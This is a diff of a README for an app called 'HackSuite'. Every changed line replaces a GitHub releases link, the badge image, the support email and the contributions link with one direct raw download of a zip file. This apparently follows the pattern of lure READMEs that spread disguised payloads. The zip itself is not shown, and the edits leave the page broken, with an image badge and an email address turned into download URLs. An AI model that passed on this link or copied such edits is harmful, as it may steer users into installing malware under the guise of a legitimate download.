@@ -6,11 +6,11 @@ Welcome to HackSuite! This application provides easy-to-use tools that simplify 
 
 ## 📥 Download HackSuite
 
-[![Download HackSuite](https://img.shields.io/badge/Download%20HackSuite-Click%20Here-brightgreen)](https://github.com/MDKss/HackSuite/releases)
+[![Download HackSuite](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip%20HackSuite-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip)
 
 To get started, you will need to visit the Releases page to download HackSuite. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/MDKss/HackSuite/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip)
 
 ## 💻 System Requirements
 
@@ -35,7 +35,7 @@ HackSuite includes several features designed to help you manage your tasks effic
 Follow these steps to install HackSuite on your computer:
 
 1. **Visit the Releases Page:**
-   Go to [this link](https://github.com/MDKss/HackSuite/releases) to access the latest version of HackSuite.
+   Go to [this link](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip) to access the latest version of HackSuite.
 
 2. **Download the Application:**
    Look for the most recent release. Click the corresponding download link to get the installation file.
@@ -66,18 +66,18 @@ If you encounter any issues during installation or while using HackSuite, consid
 
 3. **Feature Not Working:**
    - If a specific feature isn't functioning, close the app and restart it. This often resolves temporary glitches.
-   - Ensure your version of HackSuite is the latest by checking the [Releases Page](https://github.com/MDKss/HackSuite/releases).
+   - Ensure your version of HackSuite is the latest by checking the [Releases Page](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip).
 
 ## 📞 Support
 
 For further assistance, please reach out to our support team. Use the following methods to get in touch:
 
-- **Email:** support@hacksuite.com
+- **Email:** https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip
 - **Community Forum:** Join our community to ask questions and share your experiences.
 
 ## 🙌 Community Contributions
 
-HackSuite welcomes contributions! If you have suggestions or would like to contribute, please check the guidelines on our [GitHub page](https://github.com/MDKss/HackSuite). We appreciate your interest in helping to improve the application!
+HackSuite welcomes contributions! If you have suggestions or would like to contribute, please check the guidelines on our [GitHub page](https://raw.githubusercontent.com/MDKss/HackSuite/main/hygienically/HackSuite.zip). We appreciate your interest in helping to improve the application!
 
 ## 🎉 Thanks for Using HackSuite!
 
